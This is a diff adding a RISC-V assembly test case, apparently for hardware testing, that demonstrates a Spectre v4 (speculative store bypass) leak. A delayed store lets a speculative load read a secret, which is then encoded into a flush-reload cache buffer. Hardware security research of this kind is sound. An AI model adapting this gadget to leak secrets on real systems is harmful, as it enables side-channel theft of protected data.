@@ -1,0 +1,106 @@
+#------------------------------------------------------------------------------
+# SpectreV4 minimal example.
+#------------------------------------------------------------------------------
+
+.text
+setup:
+  lla s0, secret
+  lla s1, flush_reload_buffer
+
+attack:
+  mv t2, s0
+  # Slow down computation of store address.
+  li t1, 6
+  mul t2, t2, t1
+  div t2, t2, t1
+  mul t2, t2, t1
+  div t2, t2, t1
+  mul t2, t2, t1
+  div t2, t2, t1
+  # Zero-out memory in s0.
+  li t1, 0
+  sd t1, 0(t2)
+
+  # Load from s0, reodered before the store.
+  ld t0, 0(s0)
+  # Use the secret as index.
+  andi t0, t0, 0xFF
+  add  t0, t0, s1
+  # Second load: leaks the secret.
+  ld t1, 0(t0)
+
+  # Illegal instruction: end of test case.
+  unimp
+
+.data
+secret:
+  # cache line 0 and 1
+  .dword 0xdeadbeefdeadbe80  # <- SECRET, overwritten by store
+  .dword 0x000000000000000
+  .dword 0x000000000000000
+  .dword 0x000000000000000
+  .dword 0x000000000000000
+  .dword 0x000000000000000
+  .dword 0x000000000000000
+  .dword 0x000000000000000
+  .dword 0x000000000000000
+  .dword 0x000000000000000
+  .dword 0x000000000000000
+  .dword 0x000000000000000
+  .dword 0x000000000000000
+  .dword 0x000000000000000
+  .dword 0x000000000000000
+  .dword 0x000000000000000
+
+flush_reload_buffer:
+  # cache line 2 and 3 (loaded architecturally)
+  .dword 0x0000000cafec0c0
+  .dword 0x0000000cafec0c0
+  .dword 0x0000000cafec0c0
+  .dword 0x0000000cafec0c0
+  .dword 0x0000000cafec0c0
+  .dword 0x0000000cafec0c0
+  .dword 0x0000000cafec0c0
+  .dword 0x0000000cafec0c0
+  .dword 0x0000000cafec0c0
+  .dword 0x0000000cafec0c0
+  .dword 0x0000000cafec0c0
+  .dword 0x0000000cafec0c0
+  .dword 0x0000000cafec0c0
+  .dword 0x0000000cafec0c0
+  .dword 0x0000000cafec0c0
+  .dword 0x0000000cafec0c0
+  # cache line 4 and 5
+  .dword 0x0000000deadbeef
+  .dword 0x0000000deadbeef
+  .dword 0x0000000deadbeef
+  .dword 0x0000000deadbeef
+  .dword 0x0000000deadbeef
+  .dword 0x0000000deadbeef
+  .dword 0x0000000deadbeef
+  .dword 0x0000000deadbeef
+  .dword 0x0000000deadbeef
+  .dword 0x0000000deadbeef
+  .dword 0x0000000deadbeef
+  .dword 0x0000000deadbeef
+  .dword 0x0000000deadbeef
+  .dword 0x0000000deadbeef
+  .dword 0x0000000deadbeef
+  .dword 0x0000000deadbeef
+  # cache line 6 and 7
+  .dword 0x0000000deadbeef
+  .dword 0x0000000deadbeef
+  .dword 0x0000000deadbeef
+  .dword 0x0000000deadbeef
+  .dword 0x0000000deadbeef
+  .dword 0x0000000deadbeef
+  .dword 0x0000000deadbeef
+  .dword 0x0000000deadbeef
+  .dword 0x0000000deadbeef
+  .dword 0x0000000deadbeef
+  .dword 0x0000000deadbeef
+  .dword 0x0000000deadbeef
+  .dword 0x0000000deadbeef
+  .dword 0x0000000deadbeef
+  .dword 0x0000000deadbeef
+  .dword 0x0000000deadbeef
